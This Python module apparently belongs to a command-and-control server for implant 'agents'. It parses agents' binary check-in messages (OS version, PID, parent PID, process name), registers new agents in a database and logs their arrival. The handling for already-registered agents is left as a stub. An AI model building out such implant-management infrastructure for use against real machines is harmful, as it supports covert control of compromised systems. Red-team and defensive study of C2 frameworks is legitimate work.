#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import asyncio

from lib import buffer
from lib import types

# Callback types
CALLBACK_INIT = 0

class Callback:
    """
    Parses the incoming messages and executes the specified action
    from the agent.
    """
    def __init__( self, ghost ):
        # set the ghost object
        self.ghost = ghost

    async def callback_init( self, agent_id : int, message : bytes ):
        """
        Parses a CALLBACK_INIT request and adds an agent to the database.
        """
        # Parse the incoming message!
        bfparser = buffer.Parser( message );

        # Extract the agent request info to submit to the database
        agent_is64 = bfparser.get_int8();
        agent_omaj = bfparser.get_int32();
        agent_omin = bfparser.get_int32();
        agent_obld = bfparser.get_int32();
        agent_upid = bfparser.get_int32();
        agent_ppid = bfparser.get_int32();
        agent_pexe = bfparser.get_stringw();

        # Add the 'new' agent to the database!
        await self.ghost.dbs.database_agent_add( agent_id, agent_omaj, agent_omin, agent_obld, agent_upid, agent_ppid, agent_pexe );

        # Print that we got an agent!
        await self.ghost.dbs.database_event_add( types.EventLogType.GOOD, f'New agent established -> ID: {agent_id} PID: {agent_upid} Process: {agent_pexe} OS: {agent_omaj}.{agent_omin}.{agent_obld}' );

    async def parse( self, agent_id : int, message : bytes ):
        """
        Parses the incoming message and executes the requested callback.
        """
        # Determines if this is an existing agent and is still marked as alive
        is_agent = await self.ghost.dbs.database_agent_is_valid( agent_id );
        is_alive = await self.ghost.dbs.database_agent_is_alive( agent_id ) if is_agent != False else False
        
        # Parse the incoming message
        bfparser = buffer.Parser( message );

        # Are we not a valid agent? Determine if this is an initialization request!
        if not is_agent:
            # Extract the callback ID
            callback_id = bfparser.get_int8();

            # You can only send an initialization request if you are not an agent!
            if callback_id != CALLBACK_INIT:
                # Raise an Exception
                raise Exception( f'Invalid request from invalid agent {agent_id}' );

            # No issues? Dispatch to the respect handler
            return await self.callback_init( agent_id, bfparser.get_buffer() );
        elif is_agent and is_alive:
            # We got a request from a valid agent that is also still marked as alive
            pass
